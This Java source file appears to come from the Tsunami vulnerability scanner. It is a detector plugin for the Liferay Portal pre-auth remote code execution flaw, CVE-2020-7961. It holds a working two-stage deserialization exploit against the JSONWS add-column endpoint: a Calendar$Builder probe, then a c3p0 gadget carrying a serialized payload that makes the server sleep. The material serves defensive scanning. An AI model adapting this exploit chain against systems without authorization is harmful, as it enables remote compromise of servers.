/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.portal.cve20207961;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.base.Stopwatch;
import com.google.common.base.Ticker;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.BaseEncoding;
import com.google.common.io.Resources;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugins.detectors.rce.portal.cve20207961.PortalCve20207961DetectorBootstrapModule.StopwatchTicker;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;
import okhttp3.FormBody;
import okio.Buffer;

/**
 * A {@link VulnDetector} that detects Liferay Portal pre-auth RCE vulnerability (CVE-2020-7961).
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "LiferayPortalCve20207961Detector",
    version = "0.1",
    description =
        "Tsunami detector plugin for Liferay Portal pre-auth RCE vulnerability (CVE-2020-7961)",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = PortalCve20207961DetectorBootstrapModule.class)
public final class PortalCve20207961Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String VULNERABLE_PATH = "api/jsonws/expandocolumn/add-column";
  private static final String STAGE_ONE_CLASS = "java.util.Calendar$Builder";
  private static final String STAGE_ONE_PAYLOAD = "{\"calendarType\": \"TsunamiExceptionPayload\"}";
  private static final String STAGE_ONE_RESPONSE_MATCH =
      "unknown calendar type: TsunamiExceptionPayload";
  private static final String STAGE_TWO_CLASS =
      "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource";
  private static final long STAGE_TWO_SLEEP_DURATION_SECONDS = 10;

  private final Clock utcClock;
  private final Ticker ticker;
  private final HttpClient httpClient;

  private String serializedRCEPayload = null;

  @Inject
  PortalCve20207961Detector(
      @UtcClock Clock utcClock, @StopwatchTicker Ticker ticker, HttpClient httpClient) {
    this.utcClock = utcClock;
    this.ticker = ticker;
    this.httpClient = httpClient.modify().setConnectTimeout(Duration.ofSeconds(20)).build();
    try {
      this.serializedRCEPayload =
          BaseEncoding.base16()
              .lowerCase()
              .encode(Resources.toByteArray(Resources.getResource(this.getClass(), "payload.bin")));
    } catch (IOException e) {
      logger.atSevere().withCause(e).log(
          "Should never happen. Couldn't load payload resource file.");
    }
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("LiferayPortalCve20207961Detector starts detecting.");
    // This shouldn't ever be null, but if loading fails, bail out here (reporting a plugin
    // problem).
    checkNotNull(serializedRCEPayload);

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String vulnerableURL =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VULNERABLE_PATH;

    // Stage one, verify that we can cause deserialization of an arbitrary non-Portal class.
    Stopwatch stopwatch1 = Stopwatch.createStarted(ticker);
    Buffer sink = new Buffer();

    try {
      generateFormBody(STAGE_ONE_CLASS, STAGE_ONE_PAYLOAD).writeTo(sink);

      HttpRequest request1 =
          HttpRequest.post(vulnerableURL)
              .setHeaders(
                  HttpHeaders.builder()
                      .addHeader("Content-Type", "application/x-www-form-urlencoded")
                      .build())
              .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
              .build();
      HttpResponse response = httpClient.send(request1, networkService);
      stopwatch1.stop();
      String body = response.bodyString().get();
      if (!body.contains(STAGE_ONE_RESPONSE_MATCH)) {
        return false;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'", vulnerableURL);
      return false;
    }

    logger.atInfo().log("Found likely-vulnerable service, proceeding to RCE");

    // Stage two, perform RCE to cause a sleep for 10 seconds.
    String jsonRcePayload =
        String.format(
            "{\"userOverridesAsString\":\"HexAsciiSerializedMap[%s]\"}", serializedRCEPayload);
    Stopwatch stopwatch2 = Stopwatch.createStarted(ticker);
    try {
      sink = new Buffer();
      generateFormBody(STAGE_TWO_CLASS, jsonRcePayload).writeTo(sink);
      HttpRequest request2 =
          HttpRequest.post(vulnerableURL)
              .setHeaders(
                  HttpHeaders.builder()
                      .addHeader("Content-Type", "application/x-www-form-urlencoded")
                      .build())
              .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
              .build();
      HttpResponse response = httpClient.send(request2, networkService);
      stopwatch2.stop();
      if (response.status().isSuccess()) {
        // We expect an exception (out of our control) to be thrown.
        // And even if it didn't, the request should fail without creds.
        logger.atInfo().log("Request unexpectedly succeeded");
        return false;
      }

      long stage1Seconds = stopwatch1.elapsed().getSeconds();
      long stage2Seconds = stopwatch2.elapsed().getSeconds();
      if (stage2Seconds > stage1Seconds && stage2Seconds >= STAGE_TWO_SLEEP_DURATION_SECONDS) {
        return true;
      }

      logger.atInfo().log("Request did not experience expected delay.");
      return false;
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'", vulnerableURL);
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2020_7961"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Liferay Portal Pre-Auth RCE Vulnerability (CVE-2020-7961)")
                .setDescription(
                    "Deserialization of Untrusted Data in Liferay Portal prior to 7.2.1 CE GA2"
                        + " allows remote attackers to execute arbitrary code via JSON web"
                        + " services (JSONWS)."))
        .build();
  }

  private static FormBody generateFormBody(String fullyQualifiedClass, String jsonPayload) {
    return new FormBody.Builder()
        .add("tableId", "1")
        .add("name", "1")
        .add("type", "1")
        .add("defaultData:" + fullyQualifiedClass, jsonPayload)
        .build();
  }
}
